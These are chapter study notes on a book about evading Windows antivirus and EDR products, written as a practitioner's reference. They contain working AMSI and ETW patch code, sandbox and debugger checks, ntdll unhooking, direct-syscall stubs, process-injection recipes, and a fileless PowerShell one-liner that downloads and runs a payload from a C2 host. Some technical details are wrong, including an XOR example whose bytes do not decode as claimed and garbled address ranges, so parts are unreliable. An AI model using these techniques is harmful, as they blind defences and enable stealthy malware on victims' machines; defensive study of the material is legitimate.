# Evasion Engineering — Cliff Notes
**Book:** *Evasion Engineering: Building Custom* by Dennis Chow & Michael LaSalvia (No Starch Press)
**Purpose:** Chapter-aligned reference notes for follow-along study

---

## Part I — Foundations & Mindset

### Chapter 1 — Introduction to Evasion Engineering

**Core Concept:** Evasion engineering is the discipline of understanding how security tools detect threats — and systematically defeating those detection methods by building custom tooling.

**Key Ideas:**
- Security tools detect based on **signatures**, **behavior**, or **heuristics**
- Evasion is not about being 100% undetectable — it's about **raising the cost** of detection past what defenders will pay
- Custom tooling beats commodity malware because defenders tune rules to known tools (Cobalt Strike, Metasploit, etc.)
- **Attacker advantage:** defenders must detect everything; attackers only need one gap

**Detection Categories to Understand:**
| Category | What it detects |
|---|---|
| Static / Signature | File bytes, hashes, strings, patterns |
| Dynamic / Behavioral | Runtime actions (API calls, process creation, network) |
| Heuristic | Unusual sequences of behavior |
| ML-based | Statistical anomalies vs. training data |
| Memory scanning | Suspicious patterns in process memory |

**Key Mindset:** Think like a defender first. You cannot evade what you don't understand.

---

## Part II — Windows Internals for Evasion

### Chapter 2 — Windows Architecture & The Execution Environment

**Core Concept:** Evasion requires deep knowledge of how Windows executes code, manages memory, and mediates access to hardware and kernel resources.

**Key Structures:**
- **User mode vs. Kernel mode** — Security tools often live in both; crossing the boundary is audited
- **Ring model** — Ring 3 (user), Ring 0 (kernel); most evasion happens in Ring 3 but is defeated in Ring 0
- **Virtual Address Space** — Each process gets its own; typically 0x0000–0x7FFF (user), 0x8000–0xFFFF (kernel) on 64-bit

**Process Anatomy:**
```
Process
 ├── PEB (Process Environment Block)  ← lies about the process to the OS
 ├── Threads (each has a TEB)
 ├── Mapped Memory (EXE, DLLs, heap, stack)
 └── Handles (files, registry, other processes)
```

**PEB (Process Environment Block) — Critical for Evasion:**
- `PEB.Ldr` — linked list of loaded modules (can be walked to find DLL bases without LoadLibrary)
- `PEB.BeingDebugged` — flag checked by anti-debug routines
- `PEB.NtGlobalFlag` — another debugger artifact
- `PEB.ImageBaseAddress` — base of the running EXE

**WOW64 (32-bit on 64-bit Windows):**
- 32-bit processes run through a translation layer
- Syscall numbers differ between WOW64 and native 64-bit
- Heaven's Gate — technique to jump from 32-bit to 64-bit mode within a process

---

### Chapter 3 — The PE File Format

**Core Concept:** The Portable Executable (PE) format is the container for all Windows executables and DLLs. Understanding it is required for shellcode, injection, packing, and static evasion.

**PE Structure Overview:**
```
DOS Header (MZ)
  └── e_lfanew → PE Header (PE\0\0)
        ├── File Header (machine type, section count, timestamp)
        ├── Optional Header (entry point, image base, subsystem, data directories)
        └── Section Table
              ├── .text  (code)
              ├── .data  (initialized data)
              ├── .rdata (read-only data, imports, exports)
              ├── .rsrc  (resources)
              └── .reloc (base relocation table)
```

**Critical Directories (Optional Header → Data Directories):**
| Index | Directory | Evasion Relevance |
|---|---|---|
| 0 | Export Table | Finding function addresses without GetProcAddress |
| 1 | Import Table (IAT) | Commonly inspected by AV; target for manipulation |
| 2 | Resource Table | Common payload hiding location |
| 4 | Certificate Table | PE signing |
| 5 | Base Relocation | Required for ASLR; remove to harden against analysts |

**IAT (Import Address Table):**
- Resolved by the loader at runtime from DLL exports
- AV/EDR heavily scrutinizes IAT for suspicious imports (e.g., `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`)
- **Evasion:** use `GetProcAddress` at runtime, resolve manually via PEB walk, or use API hashing

**API Hashing:**
```c
// Instead of importing "VirtualAllocEx" by name:
DWORD hash = djb2("VirtualAllocEx");  // computed at compile time
FARPROC fn = GetProcAddressByHash(hash);  // walk exports at runtime
```
- Removes readable import strings from the binary
- Commonly used in shellcode and custom loaders

---

### Chapter 4 — Windows API & Syscalls

**Core Concept:** Almost all meaningful Windows operations funnel through the Windows API → Native API → Syscall chain. EDRs hook at the API layer. Going deeper defeats those hooks.

**The Call Chain:**
```
Your code
  → Win32 API     (kernel32.dll, advapi32.dll)   ← High-level, documented
  → Native API    (ntdll.dll)                      ← Low-level, NT* functions
  → Syscall stub  (mov eax, SSN; syscall)          ← Transitions to kernel
  → Kernel        (ntoskrnl.exe)
```

**Syscall Stub (x64 example):**
```asm
NtAllocateVirtualMemory:
    mov r10, rcx        ; save first arg
    mov eax, 0x18       ; SSN (System Service Number) — changes per OS version!
    syscall
    ret
```

**SSN (System Service Number):**
- A numeric index into the kernel's SSDT (System Service Descriptor Table)
- Changes between Windows versions and patch levels
- Must be resolved dynamically for reliable direct syscalls

**Why This Matters:**
- EDR hooks live in **ntdll.dll** (user mode), intercepting before the syscall fires
- Direct syscalls skip ntdll entirely → hooks are bypassed
- Indirect syscalls use the `syscall` instruction from ntdll but with custom SSN resolution

---

## Part III — Static Evasion

### Chapter 5 — Signature-Based Detection & Bypassing It

**Core Concept:** Static analysis reads a file without executing it. AV/EDR vendors extract byte patterns ("signatures") from known-bad files and flag matches.

**What Gets Scanned:**
- File hashes (MD5, SHA-1, SHA-256)
- Byte sequences (YARA rules, AV signatures)
- Strings (function names, URLs, registry keys, error messages)
- PE metadata (section names, entropy, timestamps)
- Import/Export names

**Entropy:**
- Packed/encrypted payloads have high entropy (≈8.0 = theoretical max)
- AV uses entropy as a heuristic: high entropy sections → suspicious
- **Evasion:** Pad encrypted sections with low-entropy data to dilute entropy score

**String Obfuscation Techniques:**
```c
// XOR obfuscation (simple but effective)
char enc[] = { 0x56, 0x4b, 0x72, 0x72, 0x75 };  // "Hello" XOR'd
char key   = 0x3f;
for (int i = 0; i < sizeof(enc); i++) enc[i] ^= key;

// Stack strings — build strings at runtime, never in .rdata
char cmd[4];
cmd[0] = 'c'; cmd[1] = 'm'; cmd[2] = 'd'; cmd[3] = '\0';
```

**Import Table Manipulation:**
- Remove imports entirely; resolve at runtime via `GetProcAddress`
- Use forwarded exports (e.g., `kernel32!CreateFile` forwards to `kernelbase!CreateFile`)
- Delay-load imports so they don't appear at load time

**Section Name Manipulation:**
- Default section names (`.text`, `.rdata`) are benign
- Custom section names can trigger signatures if reused from known tools
- Rename or merge sections to blend in

**Obfuscators vs. Packers vs. Crypters:**
| Technique | What it does | Detection surface |
|---|---|---|
| Obfuscator | Rewrites code logic (junk instructions, substitution) | Lower signature hit rate |
| Packer | Compresses payload; stub decompresses at runtime | Stub signatures, high entropy |
| Crypter | Encrypts payload; stub decrypts at runtime | Stub signatures, runtime behavior |
| Protector | Combines all three + anti-analysis | Most evasive; most complex |

**AMSI String Scanning:**
- AMSI (Antimalware Scan Interface) scans scripts/buffers before execution
- PowerShell, VBScript, JScript, .NET all route through AMSI
- Signatures target known tool strings: `Invoke-Mimikatz`, `amsiutils`, etc.
- **Evasion:** String fragmentation, variable substitution, encoding

---

### Chapter 6 — Building Custom Loaders

**Core Concept:** A loader is the delivery mechanism — it retrieves, decrypts, and executes your payload without touching disk in a recognizable form.

**Loader Architecture:**
```
Loader (custom EXE/DLL)
  ├── Retrieve payload    (network, resource, file, registry, steganography)
  ├── Decrypt/decompress  (AES, XOR, RC4, zlib)
  ├── Allocate memory     (VirtualAlloc or mapped section)
  ├── Write payload       (memcpy or WriteProcessMemory)
  ├── Fix permissions     (VirtualProtect → RX)
  └── Execute             (CreateThread, APC, call pointer)
```

**Memory Allocation Patterns (and why they matter):**
```c
// Suspicious: allocate RWX directly
VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  // ← huge flag

// Better: allocate RW, write, then flip to RX
LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
memcpy(mem, shellcode, size);
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
((void(*)())mem)();
```

**Payload Storage Options:**
| Location | Detection risk | Notes |
|---|---|---|
| Embedded resource | Medium | Easy to extract; high entropy flagged |
| Encrypted file on disk | Low-medium | Must drop to disk first |
| Network (staged) | Low | Requires C2 infrastructure |
| Registry value | Low | Persistence-friendly |
| Steganography (image) | Very low | Harder to automate detection |
| Environmental keying | Very low | Payload only decrypts on target machine |

**Environmental Keying:**
- Derive decryption key from target-specific data (hostname, username, domain, MAC address)
- Payload is unanalyzable outside the target environment
- Sandbox evasion by design

---

## Part IV — Dynamic & Behavioral Evasion

### Chapter 7 — Anti-Analysis & Sandbox Evasion

**Core Concept:** Sandboxes execute suspicious files in isolated VMs to observe behavior. Detecting the sandbox environment lets you suppress malicious behavior during analysis.

**Sandbox Fingerprinting Techniques:**

**Timing Attacks:**
```c
// Sandboxes often accelerate time or cap execution time
DWORD start = GetTickCount();
Sleep(5000);
DWORD elapsed = GetTickCount() - start;
if (elapsed < 4500) ExitProcess(0);  // time was accelerated → sandbox
```

**User Interaction Checks:**
```c
// Real users move mice and type; sandboxes often don't
POINT p1, p2;
GetCursorPos(&p1);
Sleep(2000);
GetCursorPos(&p2);
if (p1.x == p2.x && p1.y == p2.y) ExitProcess(0);  // no mouse movement
```

**Hardware/Environment Checks:**
```c
// Low RAM → sandbox
MEMORYSTATUSEX ms = { sizeof(ms) };
GlobalMemoryStatusEx(&ms);
if (ms.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) ExitProcess(0);  // < 2GB RAM

// Few CPU cores → sandbox
SYSTEM_INFO si;
GetSystemInfo(&si);
if (si.dwNumberOfProcessors < 2) ExitProcess(0);

// Small disk → sandbox
// Check via GetDiskFreeSpaceEx — real machines usually have > 100GB
```

**Process/Module Checks:**
```c
// Look for analysis tools running
const char* badProcs[] = { "wireshark.exe", "procmon.exe", "x64dbg.exe",
                            "ollydbg.exe", "ida.exe", "pestudio.exe" };
// Enumerate with CreateToolhelp32Snapshot → Process32Next
```

**Registry / Artifact Checks:**
```c
// VMware artifacts
RegOpenKeyEx(HKLM, "SOFTWARE\\VMware, Inc.\\VMware Tools", ...);
// VirtualBox artifacts  
RegOpenKeyEx(HKLM, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", ...);
// Check CPUID for hypervisor bit (bit 31 of ECX from CPUID leaf 1)
```

**Screen Resolution:**
```c
// Sandboxes often use 800x600 or 1024x768
int w = GetSystemMetrics(SM_CXSCREEN);
int h = GetSystemMetrics(SM_CYSCREEN);
if (w <= 800 && h <= 600) ExitProcess(0);
```

---

### Chapter 8 — Anti-Debugging Techniques

**Core Concept:** Debuggers attach to processes to inspect execution. Detecting or defeating them protects your tool from runtime analysis.

**Detection Techniques:**

**IsDebuggerPresent / PEB:**
```c
// API call (easily patched)
if (IsDebuggerPresent()) ExitProcess(0);

// Direct PEB read (harder to patch)
PPEB peb = (PPEB)__readgsqword(0x60);  // x64
if (peb->BeingDebugged) ExitProcess(0);

// NtGlobalFlag — set to 0x70 when debugged via CreateProcess
if (peb->NtGlobalFlag & 0x70) ExitProcess(0);
```

**Timing-Based Detection:**
```c
// Single-step debugging slows execution measurably
LARGE_INTEGER t1, t2;
QueryPerformanceCounter(&t1);
// ... do some instructions ...
QueryPerformanceCounter(&t2);
if ((t2.QuadPart - t1.QuadPart) > threshold) ExitProcess(0);
// Also: RDTSC instruction for cycle-level timing
```

**Hardware Breakpoint Detection:**
```c
// Debug registers (DR0–DR7) are accessible via context inspection
// Check via GetThreadContext — DR registers non-zero = hardware BP set
CONTEXT ctx = { CONTEXT_DEBUG_REGISTERS };
GetThreadContext(GetCurrentThread(), &ctx);
if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);
```

**Exception-Based Detection:**
```c
// Debuggers swallow single-step exceptions; SEH handler can detect this
__try {
    __asm { int 3 }   // software breakpoint
} __except(EXCEPTION_EXECUTE_HANDLER) {
    // If we get here without debugger intercepting → not being debugged
}
```

**Output Debug String Trick:**
```c
// OutputDebugString triggers an exception; debuggers handle it silently
DWORD err = GetLastError();
OutputDebugString("test");
if (GetLastError() == 0) ExitProcess(0);  // debugger present → error cleared
```

---

## Part V — EDR Evasion

### Chapter 9 — How EDRs Work (Userland Hooking)

**Core Concept:** EDRs inject a DLL into every process. That DLL patches the first bytes of sensitive API functions in ntdll.dll with jumps to the EDR's inspection code. Understanding this is the foundation for all EDR bypass.

**Hook Mechanics:**
```
Your code calls NtAllocateVirtualMemory()
  → EDR hook trampoline fires (5-byte JMP patch at function start)
  → EDR DLL inspection code runs (logs, checks, blocks?)
  → If allowed: jumps to original function body
  → syscall fires → kernel → returns
```

**What a Hook Looks Like:**
```asm
; Original ntdll stub (unhooked):
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18
    syscall
    ret

; Hooked by EDR:
NtAllocateVirtualMemory:
    jmp 0x00007FF812345678   ; ← 5-byte patch to EDR inspection code
    ...
```

**Commonly Hooked Functions:**
- `NtAllocateVirtualMemory` — memory allocation
- `NtWriteVirtualMemory` — writing to process memory
- `NtCreateThreadEx` — thread creation
- `NtProtectVirtualMemory` — changing memory permissions
- `NtOpenProcess` — process handle acquisition
- `NtQueueApcThread` — APC injection
- `NtMapViewOfSection` — section mapping

**Types of Hooks:**
| Hook Type | Location | Bypass Difficulty |
|---|---|---|
| Inline (5-byte JMP) | ntdll.dll in process memory | Easy — overwrite with original bytes |
| IAT hook | Import table in target process | Easy — restore original pointer |
| EAT hook | Export table in ntdll | Moderate |
| Kernel callbacks | Kernel (PsSetLoadImageNotifyRoutine, etc.) | Hard — requires kernel access |
| ETW | Kernel (Event Tracing for Windows) | Moderate |

---

### Chapter 10 — Unhooking ntdll

**Core Concept:** If you restore ntdll.dll's original bytes (before the EDR patched them), hooks are defeated for that process.

**Method 1 — Fresh Copy from Disk:**
```c
// Load a clean copy of ntdll from disk (before EDR hooks it in new processes)
HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, ...);
// Map it as a section
// Copy .text section over the hooked in-memory ntdll
```

**Method 2 — Overwrite from Suspended Process:**
```c
// Spawn a suspended copy of a benign process (e.g., notepad.exe)
// Its ntdll was mapped before EDR injected
// Read its ntdll .text section → patch into our ntdll
```

**Method 3 — Perun's Fart / Halo's Gate (SSN Extraction):**
- If a function is hooked, scan neighboring functions to find unhooked ones
- Infer the SSN from the unhooked neighbor's stub
- Use SSN to make direct syscall without unhooking at all

**Method 4 — Reading from KnownDlls:**
```c
// \KnownDlls\ntdll.dll is a section object in kernel memory
// Open it via NtOpenSection → map it → use as clean reference
UNICODE_STRING us = RTL_CONSTANT_STRING(L"\\KnownDlls\\ntdll.dll");
// NtOpenSection → NtMapViewOfSection → copy .text
```

**Timing Consideration:**
- Unhooking must happen BEFORE the EDR's DLL injection (which happens at process creation)
- Or: early unhooking at the start of your loader before any monitored APIs are called

---

### Chapter 11 — Direct & Indirect Syscalls

**Core Concept:** Skip ntdll hooks entirely by issuing syscalls directly from your code, without going through the hooked ntdll stubs.

**Direct Syscalls:**
```asm
; Implement NtAllocateVirtualMemory syscall stub inline in your code
NtAllocateVirtualMemory_Direct:
    mov r10, rcx
    mov eax, 0x18       ; SSN (must be resolved dynamically for each OS version)
    syscall
    ret
```

**SSN Resolution — Hell's Gate:**
```c
// Walk ntdll exports, find function by name/hash
// Read bytes: if not hooked → extract SSN from mov eax, XX
// If hooked → scan up/down for nearby unhooked stub (Halo's Gate)
WORD GetSSN(const char* funcName) {
    PBYTE stub = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll"), funcName);
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1)  // mov r10, rcx
        return *(WORD*)(stub + 4);  // SSN is at offset 4
    // else: hooked — scan neighbors
}
```

**Indirect Syscalls:**
- Direct syscalls are detectable: `syscall` instruction found in non-ntdll memory
- Indirect syscalls use the `syscall` instruction inside ntdll but control the SSN yourself
```asm
; Set up args and SSN, then jump into ntdll's syscall instruction
mov rax, SSN
jmp [ntdll_syscall_instruction_address]
```
- Looks like a normal ntdll syscall from the call stack perspective

**Detection of Direct Syscalls:**
- EDR can check the return address on the stack during a syscall
- If return address is NOT inside ntdll → suspicious (indicates direct syscall)
- Indirect syscalls defeat this check because they use ntdll's `syscall` instruction

---

### Chapter 12 — AMSI & ETW Bypass

**Core Concept:** AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows) are telemetry pipes that security tools use to inspect script content and API behavior. Patching them blinds those defenses.

**AMSI Architecture:**
```
PowerShell / .NET / JScript
  → AmsiScanBuffer() in amsi.dll
  → Registered AV provider (e.g., Windows Defender)
  → Returns: AMSI_RESULT_CLEAN or AMSI_RESULT_DETECTED
```

**AMSI Patching (Inline Patch):**
```c
// Make AmsiScanBuffer always return AMSI_RESULT_CLEAN (1)
PBYTE fn = (PBYTE)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
DWORD old;
VirtualProtect(fn, 6, PAGE_EXECUTE_READWRITE, &old);
// Patch: mov eax, 0x80070057; ret   (returns error, scan skipped)
// Or:    xor eax, eax; ret          (returns 0 = AMSI_RESULT_CLEAN)
fn[0] = 0xB8; *(DWORD*)(fn+1) = 0x80070057; fn[5] = 0xC3;
VirtualProtect(fn, 6, old, &old);
```

**AMSI Context Corruption:**
```c
// AmsiOpenSession creates an AMSI context struct
// Corrupt the "amsiContext" magic bytes → AmsiScanBuffer returns error
BOOL* amsiInitFailed = ... // find in PowerShell memory
*amsiInitFailed = TRUE;    // skip all scans
```

**ETW (Event Tracing for Windows):**
- Used by EDRs and Microsoft Defender to observe API call sequences
- Lives in ntdll: `EtwEventWrite` is the key function
- Patch to short-circuit logging:
```c
PBYTE fn = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll"), "EtwEventWrite");
// Patch: ret (0xC3) at function start — all ETW events silently dropped
VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old);
fn[0] = 0xC3;  // ret
```

**Detection Considerations:**
- AMSI/ETW patches are themselves a detectable behavior (writing to non-writable memory pages)
- Some EDRs watch for VirtualProtect on amsi.dll / ntdll.dll
- Solution: use direct syscalls for the VirtualProtect call itself

---

## Part VI — Process Injection

### Chapter 13 — Classic Injection Techniques

**Core Concept:** Process injection places code inside a legitimate process's memory space and executes it there, borrowing that process's identity and trust.

**Why Inject?**
- Payload runs under a trusted process (svchost, explorer, lsass)
- Evades process-based allow/block lists
- Network connections attributed to host process, not implant

**Classic DLL Injection:**
```
1. OpenProcess(target PID)         → get handle with PROCESS_ALL_ACCESS
2. VirtualAllocEx(hProc, ...)      → allocate memory in target
3. WriteProcessMemory(hProc, ...)  → write DLL path string
4. CreateRemoteThread(hProc, LoadLibraryA, dllPath)  → trigger load
```
**Detection surface:** All four Win32 APIs are heavily monitored. LoadLibraryA string visible in memory. DLL dropped to disk.

**Shellcode Injection (no DLL):**
```
1. OpenProcess
2. VirtualAllocEx (RW)
3. WriteProcessMemory (shellcode bytes)
4. VirtualProtectEx (RX)
5. CreateRemoteThread(hProc, shellcodeAddr, NULL)
```

**Process Hollowing:**
```
1. CreateProcess(target, SUSPENDED)     → create legitimate process, suspended
2. NtUnmapViewOfSection(hProc, base)    → unmap original EXE from memory
3. VirtualAllocEx at same base          → allocate space for payload
4. Write PE headers + sections          → copy payload PE into space
5. SetThreadContext (set RIP/EIP to new EP)
6. ResumeThread                         → run payload in legitimate process shell
```
- Process metadata (name, path, PID) belongs to the host
- Strong evasion against process-name-based detection
- Detectable by memory forensics (PE on disk ≠ PE in memory)

**Thread Hijacking:**
```
1. OpenThread(target thread, THREAD_ALL_ACCESS)
2. SuspendThread
3. GetThreadContext (save RIP/registers)
4. VirtualAllocEx + WriteProcessMemory (shellcode)
5. SetThreadContext (RIP = shellcode addr)
6. ResumeThread
```
- No new threads created → evades `NtCreateThreadEx` hooks
- Hijacked thread resumes at payload, returns to original code after

---

### Chapter 14 — Advanced Injection Techniques

**APC (Asynchronous Procedure Call) Injection:**
```
1. OpenProcess + VirtualAllocEx + WriteProcessMemory
2. Find alertable thread in target process
3. QueueUserAPC(shellcodeAddr, hThread, 0)
   → APC fires when thread enters alertable wait (SleepEx, WaitForSingleObjectEx)
```
- No `CreateRemoteThread` called → avoids that hook
- Requires finding an alertable thread (not always available)

**Module Stomping / DLL Hollowing:**
```
1. Map a legitimate DLL into target process (one that's rarely used)
2. Overwrite the DLL's .text section with shellcode
3. Execute from within the legitimate DLL's memory range
```
- Shellcode now appears to live inside a signed, legitimate DLL
- Defeats memory scanner rules that flag non-backed executable memory

**Reflective DLL Injection:**
- DLL contains its own loader (ReflectiveDLLLoader function)
- Loader resolves imports, fixes relocations entirely in memory
- Never touches disk; no LoadLibrary call needed
- Classic technique from Stephen Fewer (2008) — still widely used

**Section-Based Injection (Mapped Sections):**
```c
// Create shared memory section
NtCreateSection(&hSection, ..., PAGE_EXECUTE_READWRITE, SEC_COMMIT, ...);
// Map into your process + target process
NtMapViewOfSection(hSection, hTarget, &remoteBase, ...);
// Write shellcode to your view → appears in target view automatically
// Execute: NtCreateThreadEx or APC
```
- No `WriteProcessMemory` call → avoids that hook entirely
- Shared section means one write, no cross-process copy

---

## Part VII — Memory Evasion

### Chapter 15 — Evading Memory Scanners

**Core Concept:** EDRs periodically scan process memory looking for known shellcode signatures, suspicious PE headers, or executable memory not backed by a file on disk.

**What Scanners Look For:**
- MZ/PE headers in non-file-backed executable memory
- Known shellcode byte sequences
- `PAGE_EXECUTE_READWRITE` regions (RWX)
- Executable memory not associated with a loaded module

**Defeating "Unbacked" Memory Detection:**
- Use module stomping (shellcode runs from within a legit DLL's memory)
- Ensure executable memory always has a file backing

**RWX Avoidance:**
```c
// Never allocate RWX. Use:
// 1. Alloc RW
LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
// 2. Write payload
memcpy(mem, shellcode, size);
// 3. Flip to RX
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
// 4. Execute
```

**Sleep Obfuscation:**
- While your implant is sleeping (waiting for next C2 check-in), memory is exposed and scannable
- Solution: encrypt shellcode in memory while sleeping, decrypt on wake

**Ekko Sleep Obfuscation (technique):**
```
1. Encrypt shellcode region with XOR/AES
2. Queue APC chain: VirtualProtect(RW) → encrypt → Sleep → decrypt → VirtualProtect(RX)
3. APCs execute in order while implant sleeps
4. Memory is non-executable and encrypted during sleep window
```

**Foliage / Gargoyle (technique):**
- Place shellcode in non-executable memory
- Use a Windows timer or APC to briefly flip memory to RX, execute, flip back to RW
- Scanner sees non-executable memory between scan intervals

**PE Header Stomping:**
```c
// After loading, zero out the MZ/PE header of your payload
memset(imageBase, 0, 0x1000);  // destroy headers
// Scanners looking for PE headers in memory → find nothing
```

---

## Part VIII — Network & C2 Evasion

### Chapter 16 — Command & Control Communication Evasion

**Core Concept:** C2 traffic must blend in with legitimate network traffic to avoid detection by IDS/IPS, network sensors, and proxy inspection.

**Traffic Blending Fundamentals:**
- Use legitimate protocols: HTTPS, DNS, WebSockets, SMB
- Mimic legitimate User-Agents and request patterns
- Use legitimate infrastructure (CDNs, cloud providers)

**Malleable C2 Profiles (Cobalt Strike example concept):**
- Define HTTP request structure to mimic specific software
- Set custom headers, URIs, jitter timing, data transforms
- Traffic looks like a browser fetching a CDN resource

**Domain Fronting:**
```
Client → HTTPS to front domain (e.g., cdn.google.com)
  → SNI: cdn.google.com (visible to network)
  → Host header: your-c2.appspot.com (routed internally by CDN)
Network sensor sees: HTTPS to Google → benign
```
- Increasingly mitigated by CDN providers checking Host/SNI match

**DNS C2:**
```
Implant → DNS query for data.exfil.attacker.com
  → Attacker controls DNS server for attacker.com
  → Response encodes C2 command in TXT/A/CNAME records
```
- DNS traffic rarely inspected; hard to block entirely
- Low bandwidth; high latency; very covert

**HTTPS Operational Security:**
- Use a fresh domain aged >30 days (new domains flagged by reputation)
- Valid TLS certificate (Let's Encrypt)
- Host categorized as benign (IT, tech, business)
- Redirect non-C2 traffic to a legitimate page

**Sleep Jitter:**
```c
// Fixed 60-second check-in is a beacon pattern — detectable
// Add jitter: sleep 60s ± 30% random
int jitter = (rand() % 36) - 18;  // -18 to +18 seconds
Sleep((60 + jitter) * 1000);
```

---

## Part IX — Living Off the Land

### Chapter 17 — LOLBins & Trusted Binary Abuse

**Core Concept:** Use built-in Windows binaries (already trusted, signed by Microsoft) to execute payloads. No custom malware needed; attribution is difficult.

**Key LOLBins:**
| Binary | Abuse technique |
|---|---|
| `certutil.exe` | Decode Base64 payloads (`certutil -decode payload.b64 payload.exe`) |
| `mshta.exe` | Execute HTA (HTML Application) files with JScript/VBScript |
| `wscript.exe / cscript.exe` | Execute VBScript/JScript payloads |
| `regsvr32.exe` | Load COM DLLs (`regsvr32 /s /i:url scrobj.dll`) — "Squiblydoo" |
| `rundll32.exe` | Execute exported functions from any DLL |
| `msiexec.exe` | Install MSI packages (can be remote URL) |
| `bitsadmin.exe` | Download files via BITS service |
| `forfiles.exe` | Execute arbitrary commands via template |
| `wmic.exe` | WMI process creation (`wmic process call create`) |
| `installutil.exe` | Execute .NET assembly via InstallUtil infrastructure |
| `MSBuild.exe` | Compile and execute inline C# from XML project files |
| `odbcconf.exe` | Register DLL as ODBC driver (executes DllRegisterServer) |

**Fileless Execution via PowerShell:**
```powershell
# Download and execute entirely in memory — nothing on disk
IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')

# Or via encoded command (bypasses command-line logging somewhat)
powershell -enc [Base64EncodedCommand]

# Bypass execution policy (not a security boundary)
powershell -ExecutionPolicy Bypass -File payload.ps1
```

**WMI Persistence & Execution:**
```powershell
# Execute via WMI (evades many process-tree-based detections)
$wmic = [wmiclass]"\\.\root\cimv2:Win32_Process"
$wmic.Create("powershell.exe -enc ...")

# WMI Event Subscription — fileless persistence
# EventFilter + EventConsumer + FilterToConsumerBinding
# Fires on schedule, event, or system trigger → executes payload
```

**LOLBAS Reference:** https://lolbas-project.github.io — comprehensive catalog

---

## Part X — Building Custom Tools

### Chapter 18 — Custom Tool Development Philosophy

**Core Concept:** Custom tools evade signature-based detection by definition — no public samples for vendors to create signatures from. The goal is a purpose-built, minimal-footprint tool.

**Design Principles:**
1. **Minimal imports** — Only import what you need; resolve the rest at runtime
2. **No CRT** — Avoid the C Runtime Library; it adds recognizable code patterns
3. **Position-independent** — Design for shellcode delivery if needed
4. **Compile-time obfuscation** — Encrypt strings, hash API names at build time
5. **Environment awareness** — Detect and adapt to sandbox vs. production
6. **Clean exit** — Remove artifacts, clear memory on exit

**No-CRT Development:**
```c
// Entry point without CRT initialization
void __cdecl mainCRTStartup() {
    // No CRT init, no atexit, no global constructors
    // Use Windows API directly for everything
    ExitProcess(0);
}
// Compile with: /NODEFAULTLIB /GS- /entry:mainCRTStartup
```

**Shellcode Development:**
```c
// Position-independent code requirements:
// 1. No absolute addresses — use RIP-relative addressing (x64 handles this)
// 2. Resolve all APIs at runtime via PEB walk
// 3. No global/static variables (or: reference via offset from code)
// 4. No imports — everything resolved manually

// PEB Walk to find kernel32 base:
// fs:[0x30] (x86) / gs:[0x60] (x64) → PEB
// PEB.Ldr → InLoadOrderModuleList → walk to find "KERNEL32.DLL"
// Then walk kernel32 export table for GetProcAddress
// Then resolve everything else
```

**Compiler Flags for Evasion:**
```
MSVC:
  /O2            - optimize (fewer recognizable patterns)
  /GS-           - disable stack cookies (smaller, no CRT dependency)
  /NODEFAULTLIB  - no CRT
  /DEBUG:NONE    - strip debug info
  /LTCG          - link-time code gen (additional optimization)

MinGW/GCC:
  -Os -s -nostdlib -fPIC
  -masm=intel
```

---

## Quick Reference Cheat Sheet

### Evasion Decision Tree
```
What are you evading?
├── Static AV signature
│   ├── Change compiler / recompile
│   ├── Obfuscate strings
│   ├── Encrypt payload + custom loader
│   └── Change section layout / entropy
├── AMSI (script scanning)
│   ├── Patch AmsiScanBuffer
│   ├── Fragment/encode strings
│   └── Compile to binary (skip script interpreter)
├── EDR userland hooks
│   ├── Unhook ntdll (fresh copy from disk/KnownDlls)
│   ├── Direct syscalls (Hell's Gate SSN resolution)
│   └── Indirect syscalls
├── Memory scanner
│   ├── Avoid RWX; use RW→RX workflow
│   ├── Module stomping
│   ├── Sleep obfuscation (Ekko/Foliage)
│   └── PE header stomping
├── Sandbox / dynamic analysis
│   ├── Timing checks
│   ├── Hardware fingerprinting
│   ├── User interaction checks
│   └── Environmental keying
└── Network detection
    ├── HTTPS + malleable profile
    ├── Domain fronting
    ├── DNS C2
    └── Sleep jitter
```

### Key Windows APIs (and What They're Used For)
| API | Purpose | Monitoring Level |
|---|---|---|
| `VirtualAllocEx` | Allocate memory in remote process | HIGH |
| `WriteProcessMemory` | Write to remote process | HIGH |
| `CreateRemoteThread` | Execute thread in remote process | HIGH |
| `NtCreateThreadEx` | NT-level thread creation | HIGH |
| `QueueUserAPC` | Queue APC to thread | MEDIUM-HIGH |
| `NtMapViewOfSection` | Map shared section | MEDIUM |
| `VirtualProtect` | Change memory permissions | MEDIUM |
| `OpenProcess` | Get process handle | MEDIUM |
| `SetThreadContext` | Hijack thread execution | HIGH |
| `ReadProcessMemory` | Read remote process memory | MEDIUM |

### Syscall Numbers (Windows 10/11 x64 — verify for your target)
> **Always resolve dynamically — these change between builds!**
> Use Hell's Gate / Halo's Gate for reliable resolution.

| Function | Approx. SSN range |
|---|---|
| NtAllocateVirtualMemory | 0x18 |
| NtWriteVirtualMemory | 0x3A |
| NtCreateThreadEx | 0xC1 |
| NtProtectVirtualMemory | 0x50 |
| NtOpenProcess | 0x26 |
| NtQueueApcThread | 0x45 |
| NtMapViewOfSection | 0x28 |

### Tools Referenced in Evasion Engineering
| Tool | Purpose |
|---|---|
| PE-bear / CFF Explorer | PE file analysis |
| x64dbg / WinDbg | Dynamic analysis / debugging |
| Process Hacker / Process Monitor | Runtime process inspection |
| Frida | Dynamic instrumentation |
| HellsGate | SSN resolution PoC |
| SysWhispers2/3 | Direct syscall generator |
| TartarusGate | SSN via hardware breakpoint |
| Donut | Shellcode generator from EXE/DLL/.NET |
